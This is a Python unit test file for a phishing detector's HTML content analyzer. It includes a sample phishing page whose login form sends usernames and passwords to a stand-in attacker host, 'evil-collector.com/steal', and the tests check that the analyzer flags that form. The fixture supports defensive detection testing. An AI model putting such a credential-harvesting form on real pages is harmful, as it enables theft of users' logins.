"""detector.content birim testleri (ağ çağrısı mock'lanır)."""

from __future__ import annotations

from unittest.mock import patch

from detector.content import analyze_html, run_content_checks


SAMPLE_PHISH_HTML = """
<html>
  <body>
    <form action="https://evil-collector.com/steal">
      <input type="text" name="user" />
      <input type="password" name="pass" />
    </form>
    <iframe src="https://cdn.example/frame.html"></iframe>
  </body>
</html>
"""


def test_analyze_html_detects_password_form_iframe() -> None:
    result = analyze_html("https://looks-legit.com/login", SAMPLE_PHISH_HTML)
    rule_ids = {item.rule_id for item in result.findings}
    assert "password_field" in rule_ids
    assert "external_form_action" in rule_ids
    assert "iframe_present" in rule_ids
    assert result.fetched is True


@patch("detector.content.fetch_html", return_value=None)
def test_fetch_failed_finding(_mock_fetch) -> None:
    result = run_content_checks("https://example.com")
    assert any(item.rule_id == "content_fetch_failed" for item in result.findings)


@patch("detector.content.ENABLE_CONTENT_ANALYSIS", False)
def test_content_analysis_can_be_disabled() -> None:
    result = run_content_checks("https://example.com")
    assert result.findings == []
